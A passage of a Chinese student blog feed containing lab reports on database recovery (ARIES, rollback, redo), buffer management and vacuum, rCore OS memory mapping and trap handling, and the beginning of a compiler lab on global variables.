        <content type="html"><![CDATA[<h1 id="Lab-2-事务处理与故障恢复"><a href="#Lab-2-事务处理与故障恢复" class="headerlink" title="Lab 2 事务处理与故障恢复"></a>Lab 2 事务处理与故障恢复</h1><h2 id="基础功能"><a href="#基础功能" class="headerlink" title="基础功能"></a>基础功能</h2><h3 id="事务回滚"><a href="#事务回滚" class="headerlink" title="事务回滚"></a>事务回滚</h3><p><strong>日志追加</strong>见 <code>src/table/table.cpp</code>.</p><ul><li>插入记录时, 通过 <code>std::make_unique&lt;char[]&gt;(record-&gt;GetSize())</code> 新建一段缓冲区用于记录的反序列化, 在插入记录时增加写 <code>InsertLog</code> 过程, 同时若创建新的页面则增加写 <code>NewPageLog</code> 过程.</li><li>删除记录时, 直接增加写 <code>DeleteLog</code> 过程.</li></ul><p><strong>事务回滚</strong>见 <code>src/log/log_manager.cpp</code> 中的 <code>LogManager::Rollback()</code>.</p><ul><li>通过 <code>log_record-&gt;GetPrevLSN()</code> 实现 <code>lsn</code> 的倒序遍历, 根据 <code>lsn</code> 和 <code>flushed_lsn_</code> 的大小关系判断记录日志在 <code>buffer</code> 还是磁盘中.</li><li>若日志在磁盘中, 通过 <code>std::make_unique&lt;char[]&gt;(MAX_LOG_SIZE)</code> 新建一段缓冲区用于日志的反序列化, 通过 <code>disk_.ReadLog</code> 读取日志.</li><li>若日志在 <code>buffer</code> 中, 从后往前遍历 <code>log_buffer_</code>, 找到 <code>lsn</code> 对应的日志.</li></ul><p><strong>Undo 操作</strong>见 <code>src/log/log_records/*</code>.</p><ul><li>通过 <code>catalog.GetDatabaseOid()</code> 获取数据库 <code>id</code>, 并通过 <code>buffer_pool</code> 获取相应页面进行操作.</li></ul><h3 id="Redo"><a href="#Redo" class="headerlink" title="Redo"></a>Redo</h3><p><strong>Redo 日志读取</strong>见 <code>src/log/log_manager.cpp</code> - <code>LogManager::Redo()</code>.</p><ul><li>从 <code>FIRST_LSN</code> 开始, 通过 <code>lsn += log_record-&gt;GetSize()</code> 实现 <code>lsn</code> 的顺序遍历, 根据 <code>lsn</code> 和 <code>flushed_lsn_</code> 的大小关系判断记录日志在 <code>buffer</code> 还是磁盘中, 其他逻辑与<strong>事务回滚</strong>相同.</li></ul><p><strong>Redo 操作</strong>见 <code>src/log/log_records/*</code>.</p><ul><li>通过 <code>catalog.GetDatabaseOid()</code> 获取数据库 <code>id</code>, 并通过 <code>buffer_pool</code> 获取相应页面进行操作.</li></ul><h3 id="ARIES-恢复算法流程"><a href="#ARIES-恢复算法流程" class="headerlink" title="ARIES 恢复算法流程"></a>ARIES 恢复算法流程</h3><p><strong>ARIES 恢复算法</strong>见 <code>src/log/log_manager.cpp</code> - <code>LogManager::Analyze()</code>.</p><ul><li>从 <code>end_checkpoint</code> 处获取记录点的脏页表 <code>dpt</code> 与活跃事务表 <code>att</code>.</li><li>从 <code>end_checkpoint</code> 开始扫描每一条日志:<ul><li>更新活跃事务表 <code>att</code>:<ul><li>如果 <code>xid</code> 在 <code>att</code> 中:<ul><li>如果是 <code>commit</code> 类型, 把 <code>xid</code> 从 <code>att</code> 删除.</li><li>否则更新 <code>att</code> 中 <code>xid</code> 对应的 <code>last_lsn</code>.</li></ul></li><li>如果 <code>xid</code> 不在 <code>att</code> 中:<ul><li>将 <code>xid</code> 和对应的 <code>last_lsn</code> 加入 <code>att</code>.</li></ul></li></ul></li><li>更新脏页表 <code>dpt</code>:<ul><li>如果 <code>page_id</code> 不在 <code>dpt</code> 中:<ul><li>将 <code>page_id</code> 和对应的 <code>lsn</code> 加入 <code>dpt</code>.</li></ul></li><li>如果 <code>page_id</code> 在 <code>dpt</code> 中:<ul><li>跳过, 无需进行处理.</li></ul></li></ul></li></ul></li><li><code>LogManager::Redo()</code> 选择脏页表 <code>dpt</code> 中最小的 <code>rec_lsn</code> 作为开始位置, 如果 <code>dpt</code> 为, 从开始检查点的位置重做.</li><li><code>LogManager::Undo()</code> 通过活跃事务表 <code>att</code> 记录的未完成事务进行回滚.</li></ul><h2 id="实验耗时"><a href="#实验耗时" class="headerlink" title="实验耗时"></a>实验耗时</h2><ol><li><p>基础功能</p><ul><li><p>事务回滚: 2h.</p></li><li><p>Redo: 3h.</p></li><li><p>ARIES 恢复算法: 3h.</p></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统 Lab 2</title>
      <link href="/2024/04/07/cao-zuo-xi-tong-lab-2/"/>
      <url>/2024/04/07/cao-zuo-xi-tong-lab-2/</url>
      
        <content type="html"><![CDATA[<h1 id="Lab-2"><a href="#Lab-2" class="headerlink" title="Lab 2"></a>Lab 2</h1><h2 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h2><h3 id="sys-get-time-amp-sys-task-info"><a href="#sys-get-time-amp-sys-task-info" class="headerlink" title="sys_get_time &amp; sys_task_info"></a><code>sys_get_time</code> &amp; <code>sys_task_info</code></h3><ol><li>传入的 <code>ts: *mut TimeVal</code> 与 <code>ti: *mut TaskInfo</code> 是虚拟地址, 只需通过 <code>PageTable::from_token(current_user_token())</code> 手动查询页表, 将其转换为对应的物理地址, 其他实现与 <code>ch3</code> 完全相同. </li></ol><h3 id="sys-mmap-amp-sys-munmap"><a href="#sys-mmap-amp-sys-munmap" class="headerlink" title="sys_mmap &amp; sys_munmap"></a><code>sys_mmap</code> &amp; <code>sys_munmap</code></h3><ol><li>为 <code>TASK_MANAGER</code> 实现 <code>set_task_mapping(&amp;self, start: usize, len: usize, port: usize)</code> 与 <code>set_task_unmapping(&amp;self, start: usize, len: usize)</code> 方法分别用于虚存的映射与回收.</li><li><code>set_task_mapping</code> 和 <code>set_task_unmapping</code> 都从需要映射的 <code>vpn</code> 通过 <code>memory_set.translate(vpn)</code> 得到对应页表项 <code>entry</code>, 并分别保证其 <code>V</code> 位为 <code>0</code>/<code>1</code>.</li><li><code>set_task_mapping</code> 根据参数 <code>port</code> 设置相应的 <code>MapPermission</code> 位 (包括 <code>U</code> 位), 调用 <code>memory_set.insert_framed_area(...)</code>.</li><li><code>set_task_unmapping</code> 根据参数 <code>start</code> 找到区域在 <code>memory_set</code> 中对应的 <code>map_area</code>, 调用 <code>map_area.unmap(&amp;mut memory_set.page_table)</code>.</li></ol><h2 id="问答题"><a href="#问答题" class="headerlink" title="问答题"></a>问答题</h2><ol><li><p><strong>请列举 SV39 页表页表项的组成, 描述其中的标志位有何作用?</strong></p><p> 答: 页表项 [53:10] 位是物理页号, [7:0] 位是标志位, 其他为保留位, 由低到高为:</p><ul><li><code>V</code>: 页表项是否合法;</li><li><code>R</code>: 页表项对应的页面是否可读;</li><li><code>W</code>: 页表项对应的页面是否可读写;</li><li><code>X</code>: 页表项对应的页面是否可执行;</li><li><code>U</code>: 页表项对应的页面是否在 U 态下可访问;</li><li><code>G</code>: 页表项对应的页面是否为全局页面;</li><li><code>A</code>: 页表项对应的页面是否被访问过;</li><li><code>D</code>: 页表项对应的页面是否被修改过.</li></ul></li></ol><ol><li><p><strong>缺页指的是进程访问页面时页面不在页表中或在页表中无效的现象, 此时 MMU 将会返回一个中断, 告知 os 进程内存访问出了问题. os 选择填补页表并重新执行异常指令或者杀死进程.</strong></p><ol><li><p><strong>请问哪些异常可能是缺页导致的?</strong></p><p> 答: <code>Instruction page fault</code>, <code>Load/AMO page fault</code>, <code>Store/AMO page fault</code> 都是缺页导致的异常.</p></li><li><p><strong>发生缺页时, 描述相关重要寄存器的值.</strong></p><p> 答: 相关重要寄存器如下:</p><ul><li><code>scause</code>: 缺页异常发生时, 该寄存器的 <code>Interrupt</code> 位记 <code>0</code>, 表示异常发生; <code>Exception Code</code> 记录响应的缺页异常种类.</li></ul></li></ol><ul><li><p><code>stval</code>: 记录导致缺页异常的虚拟地址.</p><ul><li><code>stvec</code>: 记录异常处理程序的入口地址.</li></ul><ul><li><code>sstatus</code>, <code>sepc</code>, <code>sscratch</code> 在 ch3 报告中已描述过.</li></ul><p><strong>缺页有两个常见的原因, 其一是 Lazy 策略, 也就是直到内存页面被访问才实际进行页表操作. 比如, 一个程序被执行时, 进程的代码段理论上需要从磁盘加载到内存. 但是 os 并不会马上这样做, 而是会保存 .text 段在磁盘的位置信息, 在这些代码第一次被执行时才完成从磁盘的加载操作.</strong></p></li></ul><ol><li><p><strong>这样做有哪些好处?</strong></p><p> 答: Lazy 策略避免了页面被加载到内存中但未被访问就被淘汰, 减少了不必要的 I/O 操作.</p><p><strong>其实, 我们的 mmap 也可以采取 Lazy 策略, 比如: 一个用户进程先后申请了 10G 的内存空间, 然后用了其中 1M 就直接退出了. 按照现在的做法, 我们进行了很多没有意义的页表操作. </strong></p></li><li><p><strong>处理 <code>10G</code> 连续的内存页面, 对应的 SV39 页表大致占用多少内存 (估算数量级即可)?</strong></p><p> 答: SV39 分页模式的页面大小为 <code>4KB</code>, 单个页表项大小为 <code>8B</code>, 因此页表占用内存至少为</p><script type="math/tex; mode=display"> \dfrac{10\text{G}}{4\text{KB}}\cdot 8\text{B}=20\text{M}.</script></li></ol></li><li><p><strong>请简单思考如何才能实现 Lazy 策略, 缺页时又如何处理?</strong></p><p> 答: 进程开始时仅分配页表结构, 不分配实际的物理页面; 触发缺页异常时, 由中断处理函数查找磁盘, 分配物理页面, 并更新页表.</p></li></ol><p><strong>缺页的另一个常见原因是 swap 策略, 也就是内存页面可能被换到磁盘上了, 导致对应页面失效.</strong></p><ol><li><p><strong>此时页面失效如何表现在页表项 (PTE) 上?</strong></p><p> 答: 页面失效时, 会将相应页表项的标志位 <code>V</code> 记 <code>0</code>.</p></li></ol><ol><li><p><strong>为了防范侧信道攻击, 我们的 os 使用了双页表. 但是传统的设计一直是单页表的, 也就是说, 用户线程和对应的内核线程共用同一张页表, 只不过内核对应的地址只允许在内核态访问.</strong></p><ol><li><p><strong>在单页表情况下, 如何更换页表?</strong></p><p> 答: 单页表实现在用户进程切换时, 需要更换页表, 加载新地址空间.</p></li><li><p><strong>单页表情况下, 如何控制用户态无法访问内核页面?</strong></p><p> 答: 将内核页表中页表项的 <code>U</code> 置 <code>0</code>.</p></li><li><p><strong>单页表有何优势?</strong></p><p> 答: 在内核态和用户态转换时不需要软件更换页表, 效率更高.</p></li><li><p><strong>双页表实现下, 何时需要更换页表? 假设你写一个单页表操作系统, 你会选择何时更换页表?</strong></p><p> 答: 双页表实现在用户进程切换、自陷时需要切换页表; 我会选择在切换用户进程时更换页表.</p></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库专题训练 Lab 1</title>
      <link href="/2024/03/26/shu-ju-ku-zhuan-ti-xun-lian-lab-1/"/>
      <url>/2024/03/26/shu-ju-ku-zhuan-ti-xun-lian-lab-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Lab-1-页面组织与缓存管理"><a href="#Lab-1-页面组织与缓存管理" class="headerlink" title="Lab 1 页面组织与缓存管理"></a>Lab 1 页面组织与缓存管理</h1><h2 id="基础功能"><a href="#基础功能" class="headerlink" title="基础功能"></a>基础功能</h2><h3 id="寻找记录插入的页面"><a href="#寻找记录插入的页面" class="headerlink" title="寻找记录插入的页面"></a>寻找记录插入的页面</h3><p><strong>寻找页面</strong>见 <code>src/table/table.cpp</code> 中的 <code>Table::InsertRecord()</code>.</p><ul><li>同时记录当前页面的 <code>page_id</code> 与前一页的 <code>prev_page_id</code>, 并遍历表的页面, 如果页面有足够的空间, 通过 <code>BufferPool::GetPage()</code> 获取页面, 并且调用成员函数<code>TablePage::InsertRecord()</code> 插入记录, 返回 <code>rid</code>; 如果没有足够空间, 则通过 <code>BufferPool::NewPage()</code> 创建新页面, 插入记录并返回 <code>rid</code>.</li></ul><h3 id="页面内部记录管理"><a href="#页面内部记录管理" class="headerlink" title="页面内部记录管理"></a>页面内部记录管理</h3><p><strong>插入记录</strong>见 <code>src/table/table_page.cpp</code> - <code>TablePage::InsertRecord()</code>.</p><ul><li>插入记录时先维护 <code>lower</code> 和 <code>upper</code> 指针, 根据当前页面存储的记录数设置 <code>slots</code> 数组. 通过 <code>Record::SerializeTo()</code> 将 <code>record</code> 写入 <code>page_data_</code>, 并将页面标记为 <code>dirty</code>.</li></ul><p><strong>删除记录</strong>见 <code>src/table/table_page.cpp</code> - <code>TablePage::DeleteRecord()</code>.</p><ul><li>使用 <code>Record::DeserializeHeaderFrom()</code> 函数读取记录头, 将 <code>slot_id</code> 对应的 <code>record</code> 标记为删除, 最后使用 <code>Record::SerializeHeaderTo()</code> 将记录头写回 <code>page_data_</code>, 并将页面标记为 <code>dirty</code>.</li></ul><h3 id="记录读取策略"><a href="#记录读取策略" class="headerlink" title="记录读取策略"></a>记录读取策略</h3><p><strong>读取记录</strong>见 <code>src/table/table_scan.cpp</code> - <code>TableScan::GetNextRecord()</code>.</p><ul><li>While 循环中遍历所有 <code>page</code> 的所有 <code>slot</code>, 并通过 <code>BufferPool::GetPage()</code> 获取相应页面, 通过 <code>TablePage::GetRecord()</code> 读取一条记录. 记录不附带删除标记则直接返回, 否则通过 <code>continue</code> 跳过该次循环.</li><li><code>TablePage::GetRecord()</code> 通过 <code>Record::DeserializeFrom()</code> 读取记录数据, 同时需要通过 <code>record-&gt;SetRid(rid)</code> 设置记录对应的 <code>rid</code>.</li></ul><h3 id="LRU-缓存替换算法实现"><a href="#LRU-缓存替换算法实现" class="headerlink" title="LRU 缓存替换算法实现"></a>LRU 缓存替换算法实现</h3><p><strong>缓存替换算法</strong>见 <code>src/storage/lru_buffer_strategy.cpp</code>.</p><ul><li>为 <code>LRUBufferStrategy</code> 新增成员变量 <code>std::list&lt;*size_t*&gt; lru_list_</code>. <code>LRUBufferStrategy::Access()</code> 用于更新页面访问记录, 将访问的页面移到链表头部; <code>LRUBufferStrategy::Evict()</code> 在缓存不足时选择最近最少使用的页面, 默认为链表尾部的页面.</li></ul><h2 id="高级功能"><a href="#高级功能" class="headerlink" title="高级功能"></a>高级功能</h2><h3 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h3><h4 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h4><p><code>DatabaseEngine::Vacuum()</code> 对指定的 <code>Table</code> 调用 <code>Table::VacuumRecord()</code>, 其遍历页面, 对每个页面调用 <code>TablePage::VacuumRecord()</code>.</p><p><code>TablePage::VacuumRecord()</code> 创建新页面 <code>shared_ptr&lt;TablePage&gt;</code>, 遍历原页面的所有 <code>record</code>, 将未被标记为删除的 <code>record</code> 插入新页面, 最后拷贝新页面的信息到原页面, 实现单页内的垃圾回收.</p><p><strong>效果:</strong> 将原页面中有效的记录迁移到新页面, <code>page_data_</code> 不再包含死数据, 可用空间扩大.</p><h4 id="新增代码描述"><a href="#新增代码描述" class="headerlink" title="新增代码描述"></a>新增代码描述</h4><p>函数 <code>src/database/database_engine.cpp</code> - <code>DatabaseEngine::Vacuum()</code>:</p><ul><li>判断对所有表还是对特定的表执行 <code>vacuum</code> 操作, 调用 <code>Table</code> 对象的 <code>VacuumRecord()</code> 方法.</li></ul><p>函数 <code>src/table/table.cpp</code> - <code>Table::VacuumRecord()</code>:</p><ul><li>遍历页面, 对每个页面调用 <code>TablePage</code> 对象的 <code>VacuumRecord()</code> 方法.</li></ul><p>函数 <code>src/table/table_page.cpp</code> - <code>TablePage::VacuumRecord()</code>:</p><ul><li>创建新页面 <code>new_page</code>, 使用 <code>Init()</code> 方法初始化, 反序列化遍历原页面中的所有记录, 将所有未删除的记录插入新页面中, 最后将新页面信息拷贝到原页面中, 并输出 <code>vacuum</code> 操作前后的页面信息.</li></ul><h4 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h4><p>测试用例位于 <code>test/lab1/60-vacuum.test</code>, 在单页面内插入 6 条记录, 并删除 3 条记录, 使用 <code>vacuum test_vacuum</code> 回收死数据, 输出 <code>vacuum</code> 前后的页面信息.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> <span class="token function">make</span> debug <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> lab1/60 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202408011832720.png" alt=""></p><h3 id="空闲空间管理"><a href="#空闲空间管理" class="headerlink" title="空闲空间管理"></a>空闲空间管理</h3><h4 id="设计思路-1"><a href="#设计思路-1" class="headerlink" title="设计思路"></a>设计思路</h4><p>将页面空闲空间组织为满二叉树, 使用 <code>Table::bool pages_[TABLE_PAGE_SIZE]</code> 记录页面是否被创建, 使用 <code>Table::FreeSpaceTree fsm_tree_</code> 记录页面空闲空间.</p><p><code>FreeSpaceTree</code> 的叶子节点记录每个页面的空闲空间大小, 内部节点记录其子节点的最大值, 这样根节点就表示所有页面中的最大空闲空间.</p><p><code>insert</code> 记录时, 从 <code>FreeSpaceTree</code> 根节点开始二分查找空闲空间足够的叶子节点, 插入记录后从该叶子节点向上依次更新其所有父节点的空闲空间大小; 对表格进行 <code>vacuum</code> 操作后, 将 <code>FreeSpaceTree</code> 的所有叶子节点更新为对应的空闲空间, 并重新建树, 逐层更新内部节点.</p><p><strong>效果:</strong> 插入记录后无需使用原链表遍历的方式寻找页面, 可以使用树结构收获二分查找的效率.</p><h4 id="新增代码描述-1"><a href="#新增代码描述-1" class="headerlink" title="新增代码描述"></a>新增代码描述</h4><p>常量 <code>src/common/constants.h</code>:</p><ul><li><p>新增 FSMTree 的最大节点数, 表格最大页面数 (为测试效率设为 <code>1 &lt;&lt; 3</code>, 生产中可根据需要进行页面数设置).</p>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">static constexpr size_t FS_TREE_SIZE = (1 &lt;&lt; 3) - 1;static constexpr size_t TB_PAGE_SIZE = (FS_TREE_SIZE + 1) / 2;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><p>类 <code>src/table/free_space_tree.h</code> - <code>class FreeSpaceNode</code>:</p><ul><li>记录该节点是否为叶子节点, 存储对应的空闲空间大小.</li></ul><p>类 <code>src/table/free_space_tree.h</code> - <code>class FreeSpaceTree</code>:</p><ul><li><code>InsertRecord()</code> 从根节点开始二分查找空闲空间足够的叶子节点, 插入记录后向上依次更新所有父节点的空闲空间大小.</li><li><code>VacuumRecord()</code> 在 <code>vacuum</code> 操作回收页面空间后, 将所有叶子节点更新为对应的空闲空间, 并逐层更新内部节点的空闲空间大小.</li></ul><p>类 <code>src/table/table.h</code> - <code>class Table</code>:</p><ul><li>将原来链表遍历查找页面的方式, 改为树结构二分查找方式.</li><li>新增成员变量 <code>bool pages_[TABLE_PAGE_SIZE]</code> 记录页面的创建情况, 新增成员变量 <code>FreeSpaceTree fsm_tree_</code> 记录页面空闲空间.</li></ul><h4 id="效果展示-1"><a href="#效果展示-1" class="headerlink" title="效果展示"></a>效果展示</h4><p>测试用例位于 <code>test/lab1/60-vacuum-and-fsm.test</code>, 插入与删除一系列记录后, 进行 <code>vacuum</code> 操作, 在每次插入记录后输出页面空闲大小信息.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202408011832721.png" style="zoom:40%;"></p><p><code>vacuum</code> 操作后, 再插入一条记录, 观察到记录被插入到垃圾回收后的首页中:</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202408011832722.png" style="zoom:25%;"></p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202408011832723.png" style="zoom:47%;"></p><p>为了便于测试, 设置 <code>src/common/constants.h</code> 中 <code>TABLE_PAGE_SIZE</code> 为 4, 生产中可根据需要修改 <code>FS_TREE_SIZE</code> 进行页面数配置.</p><h2 id="实验耗时"><a href="#实验耗时" class="headerlink" title="实验耗时"></a>实验耗时</h2><ol><li>基础功能<ul><li>变长记录页面组织: 4h.</li><li>LRU 缓存替换: 0.5h.</li></ul></li><li>高级功能<ul><li>垃圾回收: 3h.</li><li>空闲空间管理: 3h.</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统 Lab 1</title>
      <link href="/2024/03/24/cao-zuo-xi-tong-lab-1/"/>
      <url>/2024/03/24/cao-zuo-xi-tong-lab-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Lab-1"><a href="#Lab-1" class="headerlink" title="Lab 1"></a>Lab 1</h1><h2 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h2><ol><li>为每个 <code>TaskControlBlock</code> 维护一个 <code>TaskInfo</code> 对象, 并为 <code>TaskInfo</code> 实现了 <code>init()</code> 默认方法用于初始化.</li><li>为 <code>TASK_MANAGER</code> 实现 <code>get_task_info(&amp;self, ti: *mut TaskInfo)</code> 与 <code>set_syscall_times(&amp;self, syscall_id: usize)</code> 方法分别用于获取当前任务的信息以及计数系统调用, 并对外暴露调用接口.</li><li>进入 <code>syscall</code> 分发函数后先调用 <code>set_syscall_times</code>, 计数当前系统调用.</li><li>在 <code>run_first_task(&amp;self)</code> 中使用 <code>get_time_ms()</code> 初始化任务调度时刻.</li><li>在 <code>TASK_MANAGER::run_next_task(&amp;self)</code> 中依据当前任务调度时刻是否为 0 判断该任务是否被首次调度, 并使用 <code>get_time_ms()</code> 进行初始化.</li></ol><h2 id="问答题"><a href="#问答题" class="headerlink" title="问答题"></a>问答题</h2><ol><li><p><strong>正确进入 U 态后, 程序的特征还应有: 使用 S 态特权指令, 访问 S 态寄存器后会报错. 可以自行测试这些内容 (运行<a href="https://github.com/LearningOS/rCore-Tutorial-Test-2024S/tree/master/src/bin">三个 bad 测例 (<code>ch2b_bad_*.rs</code>)</a>, 注意在编译时至少需要指定 <code>LOG=ERROR</code> 才能观察到内核的报错信息), 描述程序出错行为, 同时注意注明你使用的 sbi 及其版本.</strong></p><p> 答: 我使用的 sbi 版本为 <code>RustSBI 0.3.0-alpha.2</code>. </p><p> 分别报错 <code>[kernel] PageFault in application, bad addr = 0x0, bad instruction = 0x804003ac, kernel killed it</code>, <code>[kernel] Illegal Instruction in application, kernel killed it</code>, <code>[kernel] Illegal Instruction in application, kernel killed it</code>.</p><p> 分别是因为写入非法地址 <code>0x0</code>, 使用 S 态特权指令 <code>sret</code>, 以及使用 S 态指令访问 S 态寄存器 <code>sstatus</code> 导致的.</p></li></ol><ol><li><p><strong>深入理解 <a href="https://github.com/LearningOS/rCore-Tutorial-Code-2024S/blob/ch3/os/src/trap/trap.S"><code>trap.S</code></a> 中两个函数 <code>__alltraps</code> 和 <code>__restore</code> 的作用, 并回答如下问题:</strong></p><ol><li><p><strong>L40: 刚进入 <code>__restore</code> 时, <code>a0</code> 代表了什么值. 请指出 <code>__restore</code> 的两种使用情景.</strong></p><p> 答: <code>a0</code> 是指向 <code>__switch</code> 后被切换任务的 <code>TaskContext</code> 的指针; <code>__restore</code> 封装在 <code>goto_restore</code> 中, 用于任务切换或 Trap 处理这两种使用情景后从 S 态返回 U 态.</p></li></ol></li></ol><pre><code>2. **L43-L48: 这几行汇编代码特殊处理了哪些寄存器? 这些寄存器的的值对于进入用户态有何意义? 请分别解释.**    <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">ld t0, 32*8(sp)ld t1, 33*8(sp)ld t2, 2*8(sp)csrw sstatus, t0csrw sepc, t1csrw sscratch, t2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>    答: 特殊处理了 `sstatus`, `sepc`, `sscratch` 这三个特权寄存器, 在 `__alltraps` 进入 S 态前将这些特权寄存器的信息存储在了内核栈上.    + `sstatus` 保存了 Trap 发生前 CPU 的特权级等信息, 在 Trap 处理完成后正确恢复特权级.    + `sepc` 保存了 Trap 发生前最后一条指令的地址, 在 Trap 处理完成后恢复到正确的执行位置.    + `sscratch` 保存了 Trap 发生前的栈指针 `sp`, 在 Trap 处理完成后正确恢复到用户栈, 确保用户态程序正确执行.3. **L50-L56: 为何跳过了 `x2` 和 `x4`?**    <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">ld x1, 1*8(sp)ld x3, 3*8(sp).set n, 5.rept 27   LOAD_GP %n   .set n, n+1.endr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>    答: `x2` 是栈指针寄存器 `sp`: 用户栈指针已经通过 `csrw sscratch, t2` 读到了特权寄存器 `sscratch` 中, `sp` 指向当前内核栈, 用于恢复其它通用寄存器, 不可直接覆盖为用户栈指针.    `x4` 是线程指针寄存器 `tp`: 在当前情境中不会用到.4. **L60: 该指令之后, `sp` 和 `sscratch` 中的值分别有什么意义?**    <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">csrrw sp, sscratch, sp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>    答: `csrrw` 交换了 `sp` 与 `sscratch` 的值, 交换后 `sp` 指向用户栈栈顶, `sscratch` 指向内核栈栈顶, 并使用 `sret` 进行状态切换.5. **`__restore` 中发生状态切换在哪一条指令? 为何该指令执行之后会进入用户态?**    答: `sret`. 为了执行这条指令, 硬件会将特权级按 `sstatus` 的 `SPP` 字段设置为 U, 并跳转到 `sepc` 指向的指令恢复程序执行.6. **L13: 该指令之后, `sp` 和 `sscratch` 中的值分别有什么意义?**    <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">csrrw sp, sscratch, sp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>    答: `csrrw` 交换了 `sp` 与 `sscratch` 的值, 交换后 `sp` 指向内核栈栈顶, `sscratch` 指向用户栈栈顶.7. **从 U 态进入 S 态是哪一条指令发生的?**    答: 通过 `ecall` 指令执行系统调用发生从 U 态到 S 态的状态转换.</code></pre>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译原理 实验6</title>
      <link href="/2024/01/02/bian-yi-yuan-li-lab-6/"/>
      <url>/2024/01/02/bian-yi-yuan-li-lab-6/</url>
      
        <content type="html"><![CDATA[<h1 id="Stage-6-报告"><a href="#Stage-6-报告" class="headerlink" title="Stage 6 报告"></a>Stage 6 报告</h1><blockquote><p><em>写在前面:</em><br>    这一个 Stage 的实现中对着前中后端的报错疯狂调 Bug, 基本实现过程就是 [构造测例] -&gt; [看报错] -&gt; [调代码], 好在终于是实现地较为完备, 痛并快乐着 (×).<br>    报告或许会较长, 尽管尝试简化对实现思路的叙述, 最后还是保留了如下内容, 以便用尽可能简洁的描述, 将实现过程清晰地展示出来.</p></blockquote><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><h3 id="step-10"><a href="#step-10" class="headerlink" title="step 10"></a>step 10</h3><p><strong>词法语法分析</strong>: 修改 <code>frontend/ast/tree.py</code> 中 <code>Program</code> 节点的定义, 并添加 <code>globalVars()</code> 方法传递<strong>全局变量</strong>键值对. 在 <code>frontend/parser/ply_parser.py</code> 中参考已有实现, 给出相关 <code>CFG</code> 文法:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/ast/tree.py</span><span class="token keyword">class</span> <span class="token class-name">Program</span><span class="token punctuation">(</span>ListNode<span class="token punctuation">[</span>Union<span class="token punctuation">[</span><span class="token string">"Function"</span><span class="token punctuation">,</span> <span class="token string">"Declaration"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">def</span> <span class="token function">globalVars</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span>decl<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'symbol'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">:</span> decl<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'symbol'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>initValue <span class="token keyword">for</span> decl <span class="token keyword">in</span> self <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>decl<span class="token punctuation">,</span> Declaration<span class="token punctuation">)</span><span class="token punctuation">}</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>语义分析</strong>: 只需修改 <code>frontend/typecheck/namer.py</code> 的 <code>visitDeclaration</code> 部分, 如果当前作用域为全局作用域, 修改 <code>symbol.isGlobal = True</code> 即可, 并为<strong>全局变量</strong>设置<strong>初始值</strong> <code>symbol.initValue</code>.</p><p><strong>中间代码生成</strong>: 在 <code>utils/tac/tacinstr.py</code> 中参照已有实现, 添加全局变量地址加载、全局变量加载和存储的 TAC 指令:</p><pre class="line-numbers language-python" data-language="python"><code 